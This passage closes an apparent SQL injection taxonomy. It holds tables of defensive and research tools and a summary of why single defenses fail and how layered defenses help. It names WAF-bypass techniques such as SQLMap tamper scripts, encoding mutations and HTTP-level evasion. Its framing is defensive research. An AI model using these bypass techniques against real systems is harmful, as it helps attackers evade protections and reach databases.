|------|-------------|---------------|
| **ModSecurity + CRS** | Open-source WAF | OWASP Core Rule Set signature matching |
| **libinjection** | SQL token analysis library | Injection detection via SQL tokenization (syntax analysis, not signatures) |
| **sqlc / SAST Tools** | Static analysis | Detecting unsafe SQL constructs in source code |
| **Snyk / Dependabot** | Dependency security | ORM/driver vulnerability CVE monitoring |

### Research Tools

| Tool | Target Scope | Core Technique |
|------|-------------|---------------|
| **SQLMap Tamper Scripts** | WAF bypass research | 60+ encoding/obfuscation scripts (randomcase, space2comment, charunicodeencode, etc.) |
| **SqliGPT** | LLM-based SQLi detection | Black-box SQLi detection via large language models (academic research) |
| **Burp Suite + Hackvertor** | Manual SQLi testing | Real-time encoding transformation, intercept proxy |

---

## Summary: Core Principles

### Root Cause: Code-Data Conflation

The fundamental reason SQL Injection has persisted for over two decades is that SQL's design **mixes code (commands) and data (values) in the same channel**. When user input is concatenated into a SQL string, the parser cannot distinguish whether it is data or command. This fundamental conflation extends beyond text-based SQL syntax to binary wire protocols (§8-1), ORM abstractions (§8-2), and escape functions (§8-3).

### Why Incremental Patches Fail

Each defensive layer blocks only specific mutation categories while leaving others exposed:
- **Prepared Statements**: Block most of §1–§6, but cannot defend against §8-1 (protocol smuggling), §8-2 (ORM unsafe APIs), §6-2 (dynamic identifiers)
- **WAFs**: Block known patterns in §1, but are continuously bypassed by §2 (encoding mutations), §7-2 (JSON SQL), §7-3 (HTTP-level evasion)
- **ORMs**: Default APIs are safe, but raw query, extra(), and unsafe methods exist, granting developers a **false sense of security**
- **Input Validation**: Blocklists are bypassed by §2 (encoding); allowlists are difficult to apply across all input paths (§4)

### The Direction of Structural Solutions

The fundamental solution is to **enforce code-data separation at every layer**:
1. **Query Layer**: Default to Prepared Statements / parameterized queries; apply allowlists for dynamic identifiers
2. **Protocol Layer**: Strengthen binary protocol message integrity verification (prevent length field overflow)
3. **Framework Layer**: Remove or require explicit opt-in for ORM unsafe APIs
4. **Operational Layer**: Principle of least privilege (restrict DB user permissions, disable file access), suppress error messages
5. **Monitoring Layer**: Defense-in-depth combining WAF + runtime RASP + behavior-based detection

No single defensive measure can cover the entire SQL Injection mutation space — only **Defense-in-Depth** is a realistic solution.

---

*This document was created for defensive security research and vulnerability understanding purposes.*
